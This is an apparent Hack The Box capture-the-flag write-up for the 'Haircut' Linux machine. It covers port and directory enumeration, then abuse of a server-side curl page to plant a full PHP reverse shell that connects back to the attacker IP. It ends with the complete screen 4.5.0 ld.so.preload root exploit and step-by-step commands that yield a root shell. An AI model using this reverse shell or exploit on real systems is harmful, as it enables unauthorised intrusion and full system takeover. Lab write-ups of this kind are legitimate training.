# Haircut
Haircut is a HTB machine that runs Linux. Not sure about the rest yet!

## Enumeration
Lets start our enumeration with a `rustscan`:

### Rustscan
```bash
rustscan -a haircut -- -A -sCV -oN scan

# Nmap 7.95 scan initiated Sun Jun 22 17:47:14 2025 as: /usr/lib/nmap/nmap -vvv -p 22,80 -4 -A -sCV -oN scan 10.10.10.24
Nmap scan report for haircut (10.10.10.24)
Host is up, received reset ttl 63 (0.0090s latency).
Scanned at 2025-06-22 17:47:15 EDT for 8s

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e9:75:c1:e4:b3:63:3c:93:f2:c6:18:08:36:48:ce:36 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDo4pezhJs9c3u8vPWIL9eW4qxQOrHCslAdMftg/p1HDLCKc+9otg+MmQMlxF7jzEu8vJ0GPfg5ONRxlsfx1mwmAXmKLh9GK4WD2pFbg4iFiAO/BAUjs3dNdR1S9wR6F+yRc2jgIyKFJO3JohZZFnM6BrTkZO7+IkSF6b3z2qzaWorHZW04XHdbxKjVCHpU5ewWQ5B32ScKRJE8bsi04Z2lE5vk1NWK15gOqmuyEBK8fcQpD1zCI6bPc5qZlwrRv4r4krCb1h8zYtAwVnoZdtYVopfACgWHxqe+/8YqS8qo4nPfEXq8LkUc2VWmFztWMCBuwVFvW8Pf34VDD4dEiIwz
|   256 87:00:ab:a9:8f:6f:4b:ba:fb:c6:7a:55:a8:60:b2:68 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLrPH0YEefX9y/Kyg9prbVSPe3U7fH06/909UK8mAIm3eb6PWCCwXYC7xZcow1ILYvxF1GTaXYTHeDF6VqX0dzc=
|   256 b6:1b:5c:a9:26:5c:dc:61:b7:75:90:6c:88:51:6e:54 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIA+vUE7P+f2aiWmwJRuLE2qsDHrzJUzJLleMvKmIHoKM
80/tcp open  http    syn-ack ttl 63 nginx 1.10.0 (Ubuntu)
|_http-title:  HTB Hairdresser 
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-server-header: nginx/1.10.0 (Ubuntu)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.14, Linux 3.8 - 3.16
TCP/IP fingerprint:
OS:SCAN(V=7.95%E=4%D=6/22%OT=22%CT=%CU=40106%PV=Y%DS=2%DC=T%G=N%TM=685879EB
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=107%TI=Z%CI=I%II=I%TS=8)OPS(
OS:O1=M552ST11NW7%O2=M552ST11NW7%O3=M552NNT11NW7%O4=M552ST11NW7%O5=M552ST11
OS:NW7%O6=M552ST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN(
OS:R=Y%DF=Y%T=40%W=7210%O=M552NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS
OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=
OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=
OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T
OS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=
OS:S)

Uptime guess: 0.028 days (since Sun Jun 22 17:07:41 2025)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=260 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 443/tcp)
HOP RTT      ADDRESS
1   17.32 ms 10.10.14.1
2   17.09 ms haircut (10.10.10.24)

Read data files from: /usr/share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Jun 22 17:47:23 2025 -- 1 IP address (1 host up) scanned in 8.35 seconds
```
As we can see from the output of our scan, port 80, and 22 are open. SSH seems to be up to date and I am not able to connect with default credentials. Lets take a look at the website and see what we can find there.

The website is a simple `HTML` page with a picture of a woman with a haircut and thats all. Enumerating with `Wappalyzer` shows us that the website is running on `nginx 1.10.0 (Ubuntu)`. There are no other interesting things to note here, so lets move on to directory enumeration.

### Feroxbuster

```bash
feroxbuster -u http://haircut -w /usr/share/seclists/Web-Content/directory-list-lowercase-2.3-medium.txt -o ferox
```
At first, our scan only shows the `/uploads` directory. But, if we run our scan again with the `-x php` flag, we can see that there is an `exposed.php` file that we can reach.

```
feroxbuster -u http://haircut -x php -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -o ferox
                                                                                                                    
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://haircut
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💾  Output File           │ ferox
 💲  Extensions            │ [php]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        7l       13w      178c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        7l       13w      194c http://haircut/uploads => http://haircut/uploads/
200      GET      286l     1220w   226984c http://haircut/bounce.jpg
200      GET        7l       15w      144c http://haircut/
200      GET       19l       41w      446c http://haircut/exposed.php
[####################] - 4m    415260/415260  0s      found:4       errors:0      
[####################] - 4m    207629/207629  932/s   http://haircut/ 
[####################] - 4m    207629/207629  932/s   http://haircut/uploads/
```
Lets take a look at the `exposed.php` page  and see what we can find there.

### exposed.php

This page allows you to lookup a site and see if it is up or down. For example, it provides with `http://localhost/test.html` and when we click **go**, it seemingly returns the status of the site. Now, lets see if we can lookup our own site and see what we find.
```bash
nc  -lvnp 80
```
When we lookup our IP the site hangs and we see a curl request coming from the target machine:
```bash
listening on [any] 80 ...
connect to [10.10.14.15] from (UNKNOWN) [10.10.10.24] 45476
GET / HTTP/1.1
Host: 10.10.14.15
User-Agent: curl/7.47.0
Accept: */*
```
From this we can determine that the server is using user supplied input to make a curl request **AS** the server. Knowing this, lets see if we can exploit this to gain a shell. There are a couple of things I want to try first:
- Use delimiter to break out of the curl request
- Use `curl` `-o` flag to download a file to the server
- Try and read internal files like `/etc/passwd`

## Foothold

Using a delimiter to break out of the curl request returns an error that tells us we cannot use that character. It seems like there is some kind of filter stopping us from using certain characters. So lets try the `-o` flag to download a revshell to the server. (Using Pentestmonkey's PHP reverse shell)

```bash
nano shell.php
```
```php
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net

set_time_limit (0);
$VERSION = "1.0";
$ip = '10.10.14.15';
$port = 80;
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; sh -i';
$daemon = 0;
$debug = 0;

if (function_exists('pcntl_fork')) {
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

chdir("/");

umask(0);

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?>
```
Lets serve this file over port 80 using the `python3 -m http.server` command and then attempt to download it to the server using the`-o` flag:

```bash
┌──(root㉿kali)-[/home/kali/htb/haircut]
└─# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.24 - - [22/Jun/2025 19:16:07] "GET /shell.php HTTP/1.1" 200 -
^C
Keyboard interrupt received, exiting.
                                                                                                                    
┌──(root㉿kali)-[/home/kali/htb/haircut]
└─# nc -lvnp 80
listening on [any] 80 ...
connect to [10.10.14.15] from (UNKNOWN) [10.10.10.24] 45482
Linux haircut 4.4.0-78-generic #99-Ubuntu SMP Thu Apr 27 15:29:09 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
 01:16:40 up  2:13,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
sh: 0: can't access tty; job control turned off
$ whoami
www-data
$   
```
Success! We now have a shell as `www-data` on the target machine. Now, lets see if we can escalate our privileges to `root`.

## Privilege Escalation

First, lets try and get a fully interactive shell. We can do this by using the `python3 -c 'import pty; pty.spawn("/bin/bash")'` command. This gives us a better shell to work with. After this, lets try our basic enumeration commands to see what we can find.

### Insecure System Components

After digging through directories and running some basic enumeration commands we don't find anything entirely useful at first. But, once we run the `find / -perm -u=s -type f 2>/dev/null` command to look for commands with the SUID bit set, we find one that stand out among the mostly default commands: `/usr/bin/screen-4.5.0`

```bash
/bin/ntfs-3g
/bin/ping6
/bin/fusermount
/bin/su
/bin/mount
/bin/ping
/bin/umount
/usr/bin/sudo
/usr/bin/pkexec
/usr/bin/newuidmap
/usr/bin/newgrp
/usr/bin/newgidmap
/usr/bin/gpasswd
/usr/bin/at
/usr/bin/passwd
/usr/bin/screen-4.5.0
/usr/bin/chsh
/usr/bin/chfn
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
```
While we don't have ability to run `screen` with `sudo` since we don't have a password. We can still try and see if we can find an exploit for it.

### Exploiting Screen-4.5.0

Looking into the `screen-4.5.0` binary, we find that it is vulnerable to a local privilege escalation exploit. We can find the exploit on `exploit-db`.This is the raw code found on `exploit-db`:
```bash
!/bin/bash
# screenroot.sh
# setuid screen v4.5.0 local root exploit
# abuses ld.so.preload overwriting to get root.
# bug: https://lists.gnu.org/archive/html/screen-devel/2017-01/msg00025.html
# HACK THE PLANET
# ~ infodox (25/1/2017) 
echo "~ gnu/screenroot ~"
echo "[+] First, we create our shell and library..."
cat << EOF > /tmp/libhax.c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
__attribute__ ((__constructor__))
void dropshell(void){
    chown("/tmp/rootshell", 0, 0);
    chmod("/tmp/rootshell", 04755);
    unlink("/etc/ld.so.preload");
    printf("[+] done!\n");
}
EOF
gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c
rm -f /tmp/libhax.c
cat << EOF > /tmp/rootshell.c
#include <stdio.h>
int main(void){
    setuid(0);
    setgid(0);
    seteuid(0);
    setegid(0);
    execvp("/bin/sh", NULL, NULL);
}
EOF
gcc -o /tmp/rootshell /tmp/rootshell.c
rm -f /tmp/rootshell.c
echo "[+] Now we create our /etc/ld.so.preload file..."
cd /etc
umask 000 # because
screen -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so" # newline needed
echo "[+] Triggering..."
screen -ls # screen itself is setuid, so... 
/tmp/rootshell
```
It is kind of confusing at first but by carefully reading.We can determine the steps to follow to obtain root. Like I said it is bit confusing so try and keep up. If you have any problems you can always refer to the original exploit on `exploit-db`. Follow the following:

```bash
$ cd /

$ cat << EOF > /tmp/libhax.c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
__attribute__ ((__constructor__))
void dropshell(void){
	chown("/tmp/rootshell", 0, 0);
	chmod("/tmp/rootshell", 04755);
	unlink("/etc/ld.so.preload");
	printf("[+] done!\n");
}
EOF
```
Export `gcc`'s path in the environment variable:

```bash
$ export PATH=$PATH:/usr/bin
```

Compile the `C` code:

```bash
$ gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c
```
Now we create another `C` file:

```bash
$ cat << EOF > /tmp/rootshell.c
#include <stdio.h>
int main(void){
	setuid(0);
	setgid(0);
	seteuid(0);
	setegid(0);
	execvp("/bin/sh", NULL, NULL);
}
EOF
```
Compile the second `C` file:

```bash
$ gcc -o /tmp/rootshell /tmp/rootshell.c
```
Then we run the following sequence of commands to obtain root:

```bash
$ cd /etc
$ umask 000
$ screen -D -m -L ld.so.preload echo -ne "\x0a/tmp/libhax.so"
$ screen -ls
$ /tmp/rootshell
$ id

uid=0(root) gid=0(root) groups=0(root),33(www-data)
```
bOom!
